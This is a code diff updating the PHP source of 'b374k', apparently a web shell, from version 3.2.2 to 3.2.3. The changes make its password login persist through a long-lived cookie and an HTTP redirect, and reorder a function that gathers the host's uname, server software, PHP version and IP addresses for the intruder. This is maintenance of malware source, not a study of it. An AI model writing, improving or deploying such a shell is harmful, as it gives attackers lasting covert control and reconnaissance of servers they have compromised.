@@ -1,5 +1,5 @@
 <?php
-$GLOBALS['ver'] = "3.2.2";
+$GLOBALS['ver'] = "3.2.3";
 $GLOBALS['title'] = "b374k";
 
 @ob_start();
@@ -19,17 +19,12 @@ if(!function_exists('auth')){
 			if(isset($p['pass'])){
 				$your_pass = sha1(md5($p['pass']));
 				if($your_pass==$GLOBALS['pass']){
-					setcookie("pass", $your_pass);
-					$res = "
-		<script type='text/javascript'>
-		location.href='".get_self()."';
-		</script>
-		";
-					echo $res;
+					setcookie("pass", $your_pass, time()+36000, "/");
+					header("Location: ".get_self());
 				}
 			}
 
-			if(!isset($c['pass']) || (isset($c['pass'])&&($c['pass']!=$GLOBALS['pass']))){
+			if(!isset($c['pass']) || ((isset($c['pass'])&&($c['pass']!=$GLOBALS['pass'])))){
 				$res = "<!doctype html>
 		<html>
 		<head>
@@ -55,12 +50,12 @@ if(!function_exists('auth')){
 
 if(!function_exists('get_server_info')){
 	function get_server_info(){
-		$server_info['uname'] = php_uname();
-		$server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')." <span class='strong'>|</span> ":'';
-		$server_info['software'] = $server_software."  PHP ".phpversion();
 		$server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:$_SERVER["HTTP_HOST"];
 		$server_info['ip_adrress'] = "Server IP : ".$server_addr." <span class='strong'>|</span> Your IP : ".$_SERVER['REMOTE_ADDR'];
 		$server_info['time_at_server'] = "Time <span class='strong'>@</span> Server : ".@date("d M Y H:i:s",time());
+		$server_info['uname'] = php_uname();
+		$server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')." <span class='strong'>|</span> ":'';
+		$server_info['software'] = $server_software."  PHP ".phpversion();		
 		return $server_info;
 	}
 }
